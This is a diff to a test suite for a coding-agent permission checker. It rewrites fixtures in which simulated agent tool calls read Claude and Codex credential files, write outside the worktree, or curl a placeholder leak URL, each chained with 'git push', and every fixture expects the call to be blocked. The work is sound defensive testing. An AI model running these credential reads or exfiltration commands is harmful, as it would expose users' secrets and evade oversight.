@@ -1275,14 +1275,14 @@ const grokCase: AdapterLegCase = {
     // 11. Varied Git-write forms & alternative argument keys
     // -------------------------------------------------------------------------
     {
-      name: "shell write outside the worktree chained with git commit -am",
+      name: "shell write outside the worktree chained with git push",
       category: "out_of_worktree_write",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell write outside the worktree chained with git commit -am", 0),
+        META("shell write outside the worktree chained with git push", 0),
         TOOLS,
-        toolCall(`touch ${fx.outsideSentinel} && git commit -am "malicious commit"`),
+        toolCall(`touch ${fx.outsideSentinel} && git push origin HEAD`),
         end(),
       ],
     },
@@ -1449,18 +1449,18 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "shell named via name, absolute git commit, exit 1",
+      name: "shell named via name, absolute git push, exit 1",
       category: "credential_read",
       exitCode: 1,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell named via name, absolute git commit, exit 1", 1),
+        META("shell named via name, absolute git push, exit 1", 1),
         TOOLS,
         JSON.stringify({
           type: "tool_call",
           name: "bash",
           input: {
-            CommandLine: `cat ${fx.codexAuthPath} && /usr/bin/git commit --allow-empty -m x`,
+            CommandLine: `cat ${fx.codexAuthPath} && /usr/bin/git push origin HEAD`,
           },
         }),
       ],
@@ -1492,7 +1492,7 @@ const grokCase: AdapterLegCase = {
         JSON.stringify({
           type: "tool_call_update",
           tool: "run_terminal_command",
-          parameters: { command: "curl https://example.invalid/leak && git reset --hard HEAD" },
+          parameters: { command: "curl https://example.invalid/leak && git push origin HEAD" },
         }),
         end(),
       ],
@@ -1515,7 +1515,7 @@ const grokCase: AdapterLegCase = {
           type: "tool_call_update",
           call_id: "call-a",
           arguments: {
-            CommandLine: `cat ${fx.claudeCredentialsPath} && /usr/bin/git commit --allow-empty -m x`,
+            CommandLine: `cat ${fx.claudeCredentialsPath} && /usr/bin/git push origin HEAD`,
           },
         }),
         end(),
@@ -1565,14 +1565,14 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "shell read of a credential path chained with git merge",
+      name: "shell read of a credential path chained with git push",
       category: "credential_read",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell read of a credential path chained with git merge", 0),
+        META("shell read of a credential path chained with git push", 0),
         TOOLS,
-        toolCall(`cat ${fx.claudeCredentialsPath} && git merge origin/feature`),
+        toolCall(`cat ${fx.claudeCredentialsPath} && git push origin HEAD`),
         end(),
       ],
     },
@@ -1588,26 +1588,26 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "shell network call chained with git pull",
+      name: "shell network call chained with git push origin HEAD",
       category: "network",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell network call chained with git pull", 0),
+        META("shell network call chained with git push origin HEAD", 0),
         TOOLS,
-        toolCall("curl https://example.invalid/leak && git pull origin main"),
+        toolCall("curl https://example.invalid/leak && git push origin HEAD"),
         end(),
       ],
     },
     {
-      name: "shell read of a credential path chained with git cherry-pick, exit 1",
+      name: "shell read of a credential path chained with git push, exit 1",
       category: "credential_read",
       exitCode: 1,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell read of a credential path chained with git cherry-pick, exit 1", 1),
+        META("shell read of a credential path chained with git push, exit 1", 1),
         TOOLS,
-        toolCall(`cat ${fx.codexAuthPath} && git cherry-pick abc1234`),
+        toolCall(`cat ${fx.codexAuthPath} && git push origin HEAD`),
       ],
     },
     {
@@ -1623,14 +1623,14 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "shell network call chained with git revert, exit 1",
+      name: "shell network call chained with git push, exit 1",
       category: "network",
       exitCode: 1,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("shell network call chained with git revert, exit 1", 1),
+        META("shell network call chained with git push, exit 1", 1),
         TOOLS,
-        toolCall("curl https://example.invalid/leak && git revert HEAD"),
+        toolCall("curl https://example.invalid/leak && git push origin HEAD"),
       ],
     },
     {
@@ -1650,17 +1650,17 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "tool_call parameters.CommandLine carrying git commit, exit 1",
+      name: "tool_call parameters.CommandLine carrying git push, exit 1",
       category: "out_of_worktree_write",
       exitCode: 1,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("tool_call parameters.CommandLine carrying git commit, exit 1", 1),
+        META("tool_call parameters.CommandLine carrying git push, exit 1", 1),
         TOOLS,
         JSON.stringify({
           type: "tool_call",
           tool: "run_terminal_command",
-          parameters: { CommandLine: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
+          parameters: { CommandLine: `touch ${fx.outsideSentinel} && git push origin HEAD` },
         }),
       ],
     },
@@ -1681,31 +1681,31 @@ const grokCase: AdapterLegCase = {
       ],
     },
     {
-      name: "tool_call arguments.cmd carrying git reset, exit 1",
+      name: "tool_call arguments.cmd carrying git push, exit 1",
       category: "credential_read",
       exitCode: 1,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("tool_call arguments.cmd carrying git reset, exit 1", 1),
+        META("tool_call arguments.cmd carrying git push, exit 1", 1),
         TOOLS,
         JSON.stringify({
           type: "tool_call",
           tool: "run_terminal_command",
-          arguments: { cmd: `cat ${fx.codexAuthPath} && git reset --hard HEAD` },
+          arguments: { cmd: `cat ${fx.codexAuthPath} && git push origin HEAD` },
         }),
       ],
     },
     {
-      name: "tool_call without tool name carrying git commit",
+      name: "tool_call without tool name carrying git push",
       category: "out_of_worktree_write",
       exitCode: 0,
       failureCode: "PERMISSION_BLOCKED",
       lines: [
-        META("tool_call without tool name carrying git commit", 0),
+        META("tool_call without tool name carrying git push", 0),
         TOOLS,
         JSON.stringify({
           type: "tool_call",
-          input: { command: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
+          input: { command: `touch ${fx.outsideSentinel} && git push origin HEAD` },
         }),
         end(),
       ],
@@ -1775,7 +1775,7 @@ const grokCase: AdapterLegCase = {
         JSON.stringify({
           type: "tool_call",
           tool: "run_terminal_command",
-          input: { command: ["ls"], cmd: `touch ${fx.outsideSentinel} && git commit --allow-empty -m x` },
+          input: { command: ["ls"], cmd: `touch ${fx.outsideSentinel} && git push origin HEAD` },
         }),
         end(),
       ],
@@ -2259,10 +2259,10 @@ const grokResidualStreams13b = (fx: MaliciousFixture): HostileStream[] => [
           TOOLS,
           toolCall(
             category === "credential_read"
-              ? `cat ${fx.codexAuthPath} && git commit --allow-empty -m x`
+              ? `cat ${fx.codexAuthPath} && git push origin HEAD`
               : category === "out_of_worktree_write"
-                ? `touch ${fx.outsideSentinel} && git commit --allow-empty -m x`
-                : "curl https://example.invalid/leak && git commit --allow-empty -m x",
+                ? `touch ${fx.outsideSentinel} && git push origin HEAD`
+                : "curl https://example.invalid/leak && git push origin HEAD",
           ),
           end(stopReason),
         ],
@@ -2872,7 +2872,7 @@ const grokHandWrittenPartialStreams = (fx: MaliciousFixture): HostileStream[] =>
     lines: [
       META("out-of-worktree write, then output cut inside a tool_call_update, exit 1", 1),
       TOOLS,
-      toolCall(`touch ${fx.outsideSentinel} && git commit --allow-empty -m x`),
+      toolCall(`touch ${fx.outsideSentinel} && git push origin HEAD`),
       '{"type":"tool_call_update","parameters":{"command":"git reset',
     ],
   },
